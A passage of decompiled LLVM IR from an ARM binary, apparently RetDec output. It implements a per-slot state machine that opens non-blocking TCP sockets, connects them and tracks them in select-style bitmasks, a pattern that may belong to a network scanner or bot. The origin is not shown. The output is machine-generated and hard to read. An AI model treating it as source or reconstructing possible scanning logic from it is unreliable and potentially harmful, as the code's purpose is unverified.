  %v2_854c256 = load i32, i32* @sp, align 4
  %v3_854c257 = add i32 %v2_854c256, 20684
  %v4_854c258 = inttoptr i32 %v3_854c257 to i32*
  store i32 0, i32* %v4_854c258, align 4
  br label %dec_label_pc_853c.dec_label_pc_853c_crit_edge

dec_label_pc_853c.dec_label_pc_853c_crit_edge:    ; preds = %dec_label_pc_8528, %dec_label_pc_853c.dec_label_pc_853c_crit_edge
  %v0_853c.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_854c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_8540 = add i32 %v0_853c.pre, 4
  store i32 %v1_8540, i32* %r3.global-to-local, align 4
  %v1_8544 = add i32 %v0_853c.pre, 20684
  store i32 %v1_8544, i32* %ip.global-to-local, align 4
  %v7_8548 = icmp eq i32 %v1_8540, 128
  %v2_854c = load i32, i32* @sp, align 4
  %v3_854c = add i32 %v2_854c, %v1_8544
  %v4_854c = inttoptr i32 %v3_854c to i32*
  store i32 %v0_854c.pre, i32* %v4_854c, align 4
  br i1 %v7_8548, label %dec_label_pc_8554, label %dec_label_pc_853c.dec_label_pc_853c_crit_edge

dec_label_pc_8554:                                ; preds = %dec_label_pc_853c.dec_label_pc_853c_crit_edge
  %v1_8548 = add i32 %v0_853c.pre, -124
  %v6_8548 = icmp slt i32 %v1_8548, 0
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_8548, i1* %cpsr_n.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v0_8554 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_8554, i32* %r0.global-to-local, align 4
  %v1_8560259 = add i32 %v0_8554, 4
  store i32 %v1_8560259, i32* %r3.global-to-local, align 4
  %v1_8564260 = add i32 %v0_8554, 20556
  store i32 %v1_8564260, i32* %lr.global-to-local, align 4
  %v7_8568261 = icmp eq i32 %v1_8560259, 128
  %v2_856c262 = load i32, i32* @sp, align 4
  %v3_856c263 = add i32 %v2_856c262, %v1_8564260
  %v4_856c264 = inttoptr i32 %v3_856c263 to i32*
  store i32 %v0_8554, i32* %v4_856c264, align 4
  br i1 %v7_8568261, label %dec_label_pc_8574, label %dec_label_pc_855c.dec_label_pc_855c_crit_edge

dec_label_pc_855c.dec_label_pc_855c_crit_edge:    ; preds = %dec_label_pc_8554, %dec_label_pc_855c.dec_label_pc_855c_crit_edge
  %v0_855c.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_856c.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_8560 = add i32 %v0_855c.pre, 4
  store i32 %v1_8560, i32* %r3.global-to-local, align 4
  %v1_8564 = add i32 %v0_855c.pre, 20556
  store i32 %v1_8564, i32* %lr.global-to-local, align 4
  %v7_8568 = icmp eq i32 %v1_8560, 128
  %v2_856c = load i32, i32* @sp, align 4
  %v3_856c = add i32 %v2_856c, %v1_8564
  %v4_856c = inttoptr i32 %v3_856c to i32*
  store i32 %v0_856c.pre, i32* %v4_856c, align 4
  br i1 %v7_8568, label %dec_label_pc_8574, label %dec_label_pc_855c.dec_label_pc_855c_crit_edge

dec_label_pc_8574:                                ; preds = %dec_label_pc_855c.dec_label_pc_855c_crit_edge, %dec_label_pc_8554
  store i32 %v0_839c, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 %v1_83b8, i1* %cpsr_n.global-to-local, align 1
  store i1 %v2_83b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %tmp207, label %dec_label_pc_8528, label %dec_label_pc_8580

dec_label_pc_8580:                                ; preds = %dec_label_pc_8574
  store i32 %stack_var_-20872.0.ph, i32* %ip.global-to-local, align 4
  store i32 %stack_var_-20860.0.ph, i32* %r3.global-to-local, align 4
  store i32 %v5_8590, i32* %r2.global-to-local, align 4
  store i1 %v2_8594, i1* %cpsr_c.global-to-local, align 1
  store i32 %v3_8594248, i32* %lr.global-to-local, align 4
  %v0_8598 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_8598, i32* @sl, align 4
  store i32 %v1_859c, i32* @r7, align 4
  store i32 %v0_8598, i32* @r8, align 4
  store i32 %v1_85a4, i32* @r6, align 4
  store i32 1, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_8650

dec_label_pc_85b8:                                ; preds = %dec_label_pc_865c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v7_85b8 = icmp eq i8 %v3_8650, 2
  store i1 %v7_85b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_85b8, label %dec_label_pc_8d68, label %dec_label_pc_85c0

dec_label_pc_85c0:                                ; preds = %dec_label_pc_85b8
  %v2_85c0 = icmp ugt i8 %v3_8650, 3
  store i1 %v2_85c0, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_85c0 = icmp ult i8 %v3_8650, 4
  store i1 %v6_85c0, i1* %cpsr_n.global-to-local, align 1
  %v7_85c0 = icmp eq i8 %v3_8650, 4
  store i1 %v7_85c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_85c0, label %dec_label_pc_890c, label %dec_label_pc_85c8

dec_label_pc_85c8:                                ; preds = %dec_label_pc_85c0
  %v2_85c8 = icmp ugt i8 %v3_8650, 5
  store i1 %v2_85c8, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_85c8 = icmp ult i8 %v3_8650, 6
  store i1 %v6_85c8, i1* %cpsr_n.global-to-local, align 1
  %v7_85c8 = icmp eq i8 %v3_8650, 6
  store i1 %v7_85c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_85c8, label %.thread24, label %dec_label_pc_85e8

.thread24:                                        ; preds = %dec_label_pc_85c8
  %v2_85cc = add i32 %v3_8900, -1431
  %v3_85cc = inttoptr i32 %v2_85cc to i32*
  %v4_85cc = load i32, i32* %v3_85cc, align 4
  store i32 %v4_85cc, i32* %r0.global-to-local, align 4
  %v4_85d4 = udiv i32 %v4_85cc, 32
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v4_85d8 = mul nuw nsw i32 %v4_85d4, 4
  store i32 %v2_85dc, i32* %r1.global-to-local, align 4
  %v3_85e0 = add i32 %v4_85d8, %v2_85dc
  store i32 %v3_85e0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_8d48

dec_label_pc_85e8:                                ; preds = %dec_label_pc_85c8
  %v2_85e8 = icmp ugt i8 %v3_8650, 6
  store i1 %v2_85e8, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_85e8 = icmp ult i8 %v3_8650, 7
  store i1 %v6_85e8, i1* %cpsr_n.global-to-local, align 1
  %v7_85e8 = icmp eq i8 %v3_8650, 7
  store i1 %v7_85e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_85e8, label %.thread35, label %dec_label_pc_8608

.thread35:                                        ; preds = %dec_label_pc_85e8
  %v2_85ec = add i32 %v3_8900, -1431
  %v3_85ec = inttoptr i32 %v2_85ec to i32*
  %v4_85ec = load i32, i32* %v3_85ec, align 4
  store i32 %v4_85ec, i32* %r0.global-to-local, align 4
  %v4_85f4 = udiv i32 %v4_85ec, 32
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v4_85f8 = mul nuw nsw i32 %v4_85f4, 4
  store i32 %v2_85dc, i32* %r2.global-to-local, align 4
  %v3_8600 = add i32 %v4_85f8, %v2_85dc
  store i32 %v3_8600, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_8d48

dec_label_pc_8608:                                ; preds = %dec_label_pc_85e8
  %v2_8608 = icmp ugt i8 %v3_8650, 9
  store i1 %v2_8608, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_8608 = icmp ult i8 %v3_8650, 10
  store i1 %v6_8608, i1* %cpsr_n.global-to-local, align 1
  %v7_8608 = icmp eq i8 %v3_8650, 10
  store i1 %v7_8608, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8608, label %dec_label_pc_8d30, label %dec_label_pc_8610

dec_label_pc_8610:                                ; preds = %dec_label_pc_8608
  %v1_8610 = add nsw i32 %v4_8650, -11
  %v2_8610 = icmp ugt i8 %v3_8650, 10
  store i1 %v2_8610, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_8610 = icmp ult i8 %v3_8650, 11
  store i1 %v6_8610, i1* %cpsr_n.global-to-local, align 1
  %v7_8610 = icmp eq i8 %v3_8650, 11
  store i1 %v7_8610, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8610, label %dec_label_pc_98a4, label %dec_label_pc_8618

dec_label_pc_8618:                                ; preds = %dec_label_pc_8d68, %dec_label_pc_8610
  store i32 0, i32* %r3.global-to-local, align 4
  store i8 0, i8* %v2_8650, align 1
  %v0_8620 = load i32, i32* @r6, align 4
  %v1_8620 = add i32 %v0_8620, -1431
  %v2_8620 = inttoptr i32 %v1_8620 to i32*
  %v3_8620 = load i32, i32* %v2_8620, align 4
  store i32 %v3_8620, i32* %r0.global-to-local, align 4
  %v1_8624 = call i32 @function_12e9c(i32 %v3_8620)
  store i32 %v1_8624, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_862c = load i32, i32* @r6, align 4
  %v2_862c = add i32 %v1_862c, -1431
  %v3_862c = inttoptr i32 %v2_862c to i32*
  store i32 -1, i32* %v3_862c, align 4
  br label %dec_label_pc_8630

dec_label_pc_8630:                                ; preds = %dec_label_pc_8ccc, %dec_label_pc_8d48, %dec_label_pc_8750, %dec_label_pc_8664, %dec_label_pc_98a4, %dec_label_pc_8618
  store i32 %v0_839c, i32* %lr.global-to-local, align 4
  %v0_8634 = load i32, i32* @r8, align 4
  %v1_8634 = add i32 %v0_8634, 1
  store i32 %v1_8634, i32* @r8, align 4
  %v0_8638 = load i32, i32* @r7, align 4
  %v0_863c = load i32, i32* @r6, align 4
  %v2_8640 = sub i32 %v0_839c, %v1_8634
  %v3_8640 = icmp uge i32 %v0_839c, %v1_8634
  store i1 %v3_8640, i1* %cpsr_c.global-to-local, align 1
  %v4_8640 = xor i32 %v1_8634, %v0_839c
  %v5_8640 = xor i32 %v2_8640, %v0_839c
  %v6_8640 = and i32 %v5_8640, %v4_8640
  %v7_8640 = icmp slt i32 %v6_8640, 0
  store i1 %v7_8640, i1* %cpsr_v.global-to-local, align 1
  %v8_8640 = icmp slt i32 %v2_8640, 0
  store i1 %v8_8640, i1* %cpsr_n.global-to-local, align 1
  %v9_8640 = icmp eq i32 %v0_839c, %v1_8634
  store i1 %v9_8640, i1* %cpsr_z.global-to-local, align 1
  %v1_8644 = add i32 %v0_8638, 3140
  store i32 %v1_8644, i32* @r7, align 4
  %v1_8648 = add i32 %v0_863c, 3140
  store i32 %v1_8648, i32* @r6, align 4
  br i1 %v9_8640, label %dec_label_pc_8630.dec_label_pc_878c_crit_edge, label %dec_label_pc_8650

dec_label_pc_8630.dec_label_pc_878c_crit_edge:    ; preds = %dec_label_pc_8630
  %v0_878c.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_878c

dec_label_pc_8650:                                ; preds = %dec_label_pc_876c, %dec_label_pc_8630, %dec_label_pc_8580
  %v3_8900 = phi i32 [ %v1_85a4, %dec_label_pc_8580 ], [ %v1_8648, %dec_label_pc_8630 ], [ %v1_8784, %dec_label_pc_876c ]
  %v1_8650 = add i32 %v3_8900, -1427
  %v2_8650 = inttoptr i32 %v1_8650 to i8*
  %v3_8650 = load i8, i8* %v2_8650, align 1
  %v4_8650 = zext i8 %v3_8650 to i32
  store i32 %v4_8650, i32* %r3.global-to-local, align 4
  %v2_8654 = icmp ne i8 %v3_8650, 0
  store i1 %v2_8654, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_8654 = icmp eq i8 %v3_8650, 0
  store i1 %v6_8654, i1* %cpsr_n.global-to-local, align 1
  %v7_8654 = icmp eq i8 %v3_8650, 1
  store i1 %v7_8654, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8654, label %dec_label_pc_88f4, label %dec_label_pc_865c

dec_label_pc_865c:                                ; preds = %dec_label_pc_8650
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 %v6_8654, i1* %cpsr_z.global-to-local, align 1
  br i1 %v6_8654, label %dec_label_pc_8664, label %dec_label_pc_85b8

dec_label_pc_8664:                                ; preds = %.thread43.dec_label_pc_8664_crit_edge, %dec_label_pc_865c
  %v0_8664 = phi i32 [ %v0_8664.pre, %.thread43.dec_label_pc_8664_crit_edge ], [ %v3_8900, %dec_label_pc_865c ]
  %v1_8664 = add i32 %v0_8664, -1431
  %v2_8664 = inttoptr i32 %v1_8664 to i32*
  %v3_8664 = load i32, i32* %v2_8664, align 4
  store i32 %v3_8664, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  store i32 %v10_82f0, i32* %r1.global-to-local, align 4
  %v1_8670 = add i32 %v3_8664, 1
  %v2_8670 = icmp eq i32 %v3_8664, -1
  store i1 %v2_8670, i1* %cpsr_c.global-to-local, align 1
  %v3_8670 = sub i32 0, %v3_8664
  %v4_8670 = and i32 %v1_8670, %v3_8670
  %v5_8670 = icmp slt i32 %v4_8670, 0
  store i1 %v5_8670, i1* %cpsr_v.global-to-local, align 1
  %v6_8670 = icmp slt i32 %v1_8670, 0
  store i1 %v6_8670, i1* %cpsr_n.global-to-local, align 1
  %v7_8670 = icmp eq i32 %v1_8670, 0
  store i1 %v7_8670, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-72, align 4
  %v1_8684 = xor i1 %v7_8670, true
  call void @__pseudo_cond_branch(i1 %v1_8684, i32 ptrtoint (i32* @global_var_12e9c.25 to i32))
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_8690 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_8690, i32* %r2.global-to-local, align 4
  %v3_8694 = call i32 @function_13790(i32 2, i32 1, i32 %v0_8690)
  store i32 %v3_8694, i32* %r0.global-to-local, align 4
  %v1_8698 = add i32 %v3_8694, 1
  %v2_8698 = icmp eq i32 %v3_8694, -1
  store i1 %v2_8698, i1* %cpsr_c.global-to-local, align 1
  %v3_8698 = sub i32 0, %v3_8694
  %v4_8698 = and i32 %v1_8698, %v3_8698
  %v5_8698 = icmp slt i32 %v4_8698, 0
  store i1 %v5_8698, i1* %cpsr_v.global-to-local, align 1
  %v6_8698 = icmp slt i32 %v1_8698, 0
  store i1 %v6_8698, i1* %cpsr_n.global-to-local, align 1
  %v7_8698 = icmp eq i32 %v1_8698, 0
  store i1 %v7_8698, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_8694, i32* @r4, align 4
  %v1_86a0 = load i32, i32* @r6, align 4
  %v2_86a0 = add i32 %v1_86a0, -1431
  %v3_86a0 = inttoptr i32 %v2_86a0 to i32*
  store i32 %v3_8694, i32* %v3_86a0, align 4
  br i1 %v7_8698, label %dec_label_pc_8630, label %dec_label_pc_86a8

dec_label_pc_86a8:                                ; preds = %dec_label_pc_8664
  store i32 3, i32* %r1.global-to-local, align 4
  %v0_86ac = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_86ac, i32* @r2, align 4
  %v0_86b0 = load i32, i32* %r0.global-to-local, align 4
  %v2_86b0 = call i32 @function_12dac(i32 %v0_86b0, i32 3)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_86b8 = or i32 %v2_86b0, 2048
  store i32 %v1_86b8, i32* @r2, align 4
  %v0_86bc = load i32, i32* @r4, align 4
  store i32 %v0_86bc, i32* %r0.global-to-local, align 4
  %v2_86c0 = call i32 @function_12dac(i32 %v0_86bc, i32 4)
  store i32 %v2_86c0, i32* %r0.global-to-local, align 4
  store i32 %v10_82f0, i32* %lr.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.26 to i32), i32 -1), i32* %ip.global-to-local, align 4
  store i32 %v2_86d0, i32* %r3.global-to-local, align 4
  %v0_86d4 = load i32, i32* @r6, align 4
  %v1_86d4 = add i32 %v0_86d4, -1431
  %v2_86d4 = inttoptr i32 %v1_86d4 to i32*
  %v3_86d4 = load i32, i32* %v2_86d4, align 4
  store i32 %v3_86d4, i32* %r0.global-to-local, align 4
  %v0_86d8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_86d8, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.26 to i32), i32 -1), i32* %stack_var_-40, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 %v2_86e8, i32* %r3.global-to-local, align 4
  %v6_86f0 = call i32 @function_13760(i32 %v3_86d4, i32 %v0_86d8, i32 8, i32* nonnull %stack_var_-40, i32 4)
  store i32 %v6_86f0, i32* %r0.global-to-local, align 4
  %v0_86f4 = load i32, i32* @r6, align 4
  %v1_86f4 = add i32 %v0_86f4, -1415
  %v2_86f4 = inttoptr i32 %v1_86f4 to i32*
  %v3_86f4 = load i32, i32* %v2_86f4, align 4
  store i32 %v3_86f4, i32* %ip.global-to-local, align 4
  store i32 %v10_82f0, i32* %lr.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v1_8704 = add i32 %v0_86f4, -1431
  %v2_8704 = inttoptr i32 %v1_8704 to i32*
  %v3_8704 = load i32, i32* %v2_8704, align 4
  store i32 %v3_8704, i32* %r0.global-to-local, align 4
  %v3_870c = add i32 %v0_86f4, -1427
  %v4_870c = inttoptr i32 %v3_870c to i8*
  store i8 2, i8* %v4_870c, align 1
  store i32 %v4_8710, i32* %ip.global-to-local, align 4
  %v0_8714 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_8714, i32* %stack_var_-72, align 4
  store i32 %v4_8718, i32* %r3.global-to-local, align 4
  store i32 %v2_8728, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v0_8730 = load i32, i32* %sb.global-to-local, align 4
  %v1_8730 = load i32, i32* @r6, align 4
  %v2_8730 = add i32 %v1_8730, -1423
  %v3_8730 = inttoptr i32 %v2_8730 to i32*
  store i32 %v0_8730, i32* %v3_8730, align 4
  %v4_8734 = call i32 @function_135ec(i32 %v3_8704, %sockaddr* nonnull %v3_8734, i32 16)
  store i32 %v4_8734, i32* %r0.global-to-local, align 4
  %v0_8738 = load i32, i32* @r6, align 4
  %v1_8738 = add i32 %v0_8738, -1431
  %v2_8738 = inttoptr i32 %v1_8738 to i32*
  %v3_8738 = load i32, i32* %v2_8738, align 4
  store i32 %v3_8738, i32* %r0.global-to-local, align 4
  %v3_8740 = udiv i32 %v3_8738, 32
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_8744 = mul nuw nsw i32 %v3_8740, 4
  store i32 %v3_8744, i32* %r3.global-to-local, align 4
  store i32 %v2_8748, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_8750

dec_label_pc_8750:                                ; preds = %dec_label_pc_8d78, %dec_label_pc_86a8
  %v1_875c = phi i32 [ %v3_8738, %dec_label_pc_86a8 ], [ %v3_8d78, %dec_label_pc_8d78 ]
  %v3_8744.pn = phi i32 [ %v3_8744, %dec_label_pc_86a8 ], [ %v3_8d84, %dec_label_pc_8d78 ]
  %storemerge = add i32 %v3_8744.pn, %v2_8748
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  %v1_8750 = add i32 %storemerge, -292
  %v2_8750 = inttoptr i32 %v1_8750 to i32*
  %v3_8750 = load i32, i32* %v2_8750, align 4
  %v1_8754 = urem i32 %v1_875c, 32
  store i32 %v1_8754, i32* %r1.global-to-local, align 4
  %v1_8758 = load i32, i32* %fp.global-to-local, align 4
  %v7_8758 = shl i32 %v1_8758, %v1_8754
  %v8_8758 = or i32 %v7_8758, %v3_8750
  store i32 %v8_8758, i32* %r2.global-to-local, align 4
  %v0_875c = load i32, i32* @sl, align 4
  %v2_875c = sub i32 %v0_875c, %v1_875c
  %v3_875c = icmp uge i32 %v0_875c, %v1_875c
  store i1 %v3_875c, i1* %cpsr_c.global-to-local, align 1
  %v4_875c = xor i32 %v0_875c, %v1_875c
  %v5_875c = xor i32 %v2_875c, %v0_875c
  %v6_875c = and i32 %v5_875c, %v4_875c
  %v7_875c = icmp slt i32 %v6_875c, 0
  store i1 %v7_875c, i1* %cpsr_v.global-to-local, align 1
  %v8_875c = icmp slt i32 %v2_875c, 0
  store i1 %v8_875c, i1* %cpsr_n.global-to-local, align 1
  %v9_875c = icmp eq i32 %v0_875c, %v1_875c
  store i1 %v9_875c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v8_8758, i32* %v2_8750, align 4
  %v2_8764 = xor i1 %v8_875c, %v7_875c
  br i1 %v2_8764, label %dec_label_pc_8768, label %dec_label_pc_8630

dec_label_pc_8768:                                ; preds = %dec_label_pc_8750
  %v0_8768 = load i32, i32* %r0.global-to-local, align 4
  %v1_8768 = add i32 %v0_8768, 1
  store i32 %v1_8768, i32* @sl, align 4
  br label %dec_label_pc_876c

dec_label_pc_876c:                                ; preds = %dec_label_pc_8d60, %dec_label_pc_8d28, %dec_label_pc_8768
  %v0_878c98 = phi i32 [ %v1_8d60, %dec_label_pc_8d60 ], [ %v1_8d28, %dec_label_pc_8d28 ], [ %v1_8768, %dec_label_pc_8768 ]
  store i32 %v0_839c, i32* %lr.global-to-local, align 4
  %v0_8770 = load i32, i32* @r8, align 4
  %v1_8770 = add i32 %v0_8770, 1
  store i32 %v1_8770, i32* @r8, align 4
  %v0_8774 = load i32, i32* @r7, align 4
  %v0_8778 = load i32, i32* @r6, align 4
  %v2_877c = sub i32 %v0_839c, %v1_8770
  %v3_877c = icmp uge i32 %v0_839c, %v1_8770
  store i1 %v3_877c, i1* %cpsr_c.global-to-local, align 1
  %v4_877c = xor i32 %v1_8770, %v0_839c
  %v5_877c = xor i32 %v2_877c, %v0_839c
  %v6_877c = and i32 %v5_877c, %v4_877c
  %v7_877c = icmp slt i32 %v6_877c, 0
  store i1 %v7_877c, i1* %cpsr_v.global-to-local, align 1
  %v8_877c = icmp slt i32 %v2_877c, 0
  store i1 %v8_877c, i1* %cpsr_n.global-to-local, align 1
  %v9_877c = icmp eq i32 %v0_839c, %v1_8770
  store i1 %v9_877c, i1* %cpsr_z.global-to-local, align 1
  %v1_8780 = add i32 %v0_8774, 3140
  store i32 %v1_8780, i32* @r7, align 4
  %v1_8784 = add i32 %v0_8778, 3140
  store i32 %v1_8784, i32* @r6, align 4
  br i1 %v9_877c, label %dec_label_pc_878c, label %dec_label_pc_8650

dec_label_pc_878c:                                ; preds = %dec_label_pc_876c, %dec_label_pc_8630.dec_label_pc_878c_crit_edge
  %v0_87c4 = phi i32 [ %v0_878c.pre, %dec_label_pc_8630.dec_label_pc_878c_crit_edge ], [ %v0_878c98, %dec_label_pc_876c ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_878c = icmp slt i32 %v0_87c4, 0
  store i1 %v1_878c, i1* %cpsr_n.global-to-local, align 1
  %v2_878c = icmp eq i32 %v0_87c4, 0
  store i1 %v2_878c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_878c, label %dec_label_pc_8528, label %dec_label_pc_8794

dec_label_pc_8794:                                ; preds = %dec_label_pc_878c
  store i32 %v10_82f0, i32* %lr.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 1, i32* %stack_var_-56, align 4
  store i32 %v2_87b4, i32* %ip.global-to-local, align 4
  store i32 %v2_87b8, i32* %r1.global-to-local, align 4
  store i32 %v2_87bc, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v0_87c4, i32* %r0.global-to-local, align 4
  %v5_87cc = call i32 @function_130bc(i32 %v0_87c4, i32 %v2_87b8, i32 %v2_87bc, i32 0, i32 %v2_87b4)
  store i32 %v5_87cc, i32* @r4, align 4
  %v0_87d4 = load i32, i32* @r5, align 4
  store i32 %v0_87d4, i32* %r0.global-to-local, align 4
  %v1_87d8 = inttoptr i32 %v0_87d4 to i32*
  %v2_87d8 = call i32 @function_1316c(i32* %v1_87d8)
  store i32 %v2_87d8, i32* %r0.global-to-local, align 4
  %v0_87dc = load i32, i32* @r4, align 4
  %v1_87dc = load i32, i32* @r5, align 4
  %v2_87dc = sub i32 %v0_87dc, %v1_87dc
  %v3_87dc = icmp uge i32 %v0_87dc, %v1_87dc
  store i1 %v3_87dc, i1* %cpsr_c.global-to-local, align 1
  %v4_87dc = xor i32 %v1_87dc, %v0_87dc
  %v5_87dc = xor i32 %v2_87dc, %v0_87dc
  %v6_87dc = and i32 %v5_87dc, %v4_87dc
  %v7_87dc = icmp slt i32 %v6_87dc, 0
  store i1 %v7_87dc, i1* %cpsr_v.global-to-local, align 1
  %v8_87dc = icmp slt i32 %v2_87dc, 0
  store i1 %v8_87dc, i1* %cpsr_n.global-to-local, align 1
  %v9_87dc = icmp eq i32 %v0_87dc, %v1_87dc
  store i1 %v9_87dc, i1* %cpsr_z.global-to-local, align 1
  %v7_87e4 = icmp sgt i32 %v0_87dc, %v1_87dc
  br i1 %v7_87e4, label %dec_label_pc_87e8, label %dec_label_pc_8528

dec_label_pc_87e8:                                ; preds = %dec_label_pc_8794
  store i32 %stack_var_-20868.0.ph, i32* @r8, align 4
  br label %dec_label_pc_8858

dec_label_pc_87f4:                                ; preds = %.thread38.dec_label_pc_87f4_crit_edge, %dec_label_pc_8868
  %v0_880c = phi i32 [ %v0_87f4.pre, %.thread38.dec_label_pc_87f4_crit_edge ], [ %v3_8858, %dec_label_pc_8868 ]
  %v3_87f4 = udiv i32 %v0_880c, 32
  store i32 %v2_8748, i32* %r2.global-to-local, align 4
  %v3_8800 = mul nuw nsw i32 %v3_87f4, 4
  %v2_8804 = add i32 %v3_8800, %v2_8748
  store i32 %v2_8804, i32* %r3.global-to-local, align 4
  %v1_8808 = add i32 %v2_8804, -164
  %v2_8808 = inttoptr i32 %v1_8808 to i32*
  %v3_8808 = load i32, i32* %v2_8808, align 4
  %v1_880c = urem i32 %v0_880c, 32
  store i32 %v1_880c, i32* %r1.global-to-local, align 4
  %v2_8810 = add nsw i32 %v1_880c, -1
  %v3_8810 = shl i32 1, %v2_8810
  %v4_8810 = and i32 %v3_8810, %v3_8808
  %v5_8810 = icmp ne i32 %v4_8810, 0
  store i1 %v5_8810, i1* %cpsr_c.global-to-local, align 1
  %v6_8810 = lshr i32 %v3_8808, %v1_880c
  store i32 %v6_8810, i32* %r2.global-to-local, align 4
  %v1_8814 = urem i32 %v6_8810, 2
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_8814 = icmp eq i32 %v1_8814, 0
  store i1 %v2_8814, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8814, label %dec_label_pc_8838, label %dec_label_pc_881c

dec_label_pc_881c:                                ; preds = %dec_label_pc_87f4
  %v0_881c = load i32, i32* @r8, align 4
  %v1_881c = add i32 %v0_881c, -1452
  %v2_881c = inttoptr i32 %v1_881c to i8*
  %v3_881c = load i8, i8* %v2_881c, align 1
  %v4_881c = zext i8 %v3_881c to i32
  store i32 %v4_881c, i32* %r3.global-to-local, align 4
  %v2_8820 = icmp ugt i8 %v3_881c, 5
  store i1 %v2_8820, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_8820 = icmp ult i8 %v3_881c, 6
  store i1 %v6_8820, i1* %cpsr_n.global-to-local, align 1
  %v7_8820 = icmp eq i8 %v3_881c, 6
  store i1 %v7_8820, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8820, label %dec_label_pc_8dd0, label %dec_label_pc_8828

dec_label_pc_8828:                                ; preds = %dec_label_pc_881c
  %v2_8828 = icmp ugt i8 %v3_881c, 6
  store i1 %v2_8828, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_8828 = icmp ult i8 %v3_881c, 7
  store i1 %v6_8828, i1* %cpsr_n.global-to-local, align 1
  %v7_8828 = icmp eq i8 %v3_881c, 7
  store i1 %v7_8828, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8828, label %dec_label_pc_940c, label %dec_label_pc_8830

dec_label_pc_8830:                                ; preds = %dec_label_pc_8828
  %v2_8830 = icmp ugt i8 %v3_881c, 9
  store i1 %v2_8830, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_8830 = icmp ult i8 %v3_881c, 10
  store i1 %v6_8830, i1* %cpsr_n.global-to-local, align 1
  %v7_8830 = icmp eq i8 %v3_881c, 10
  store i1 %v7_8830, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8830, label %dec_label_pc_961c, label %dec_label_pc_8838

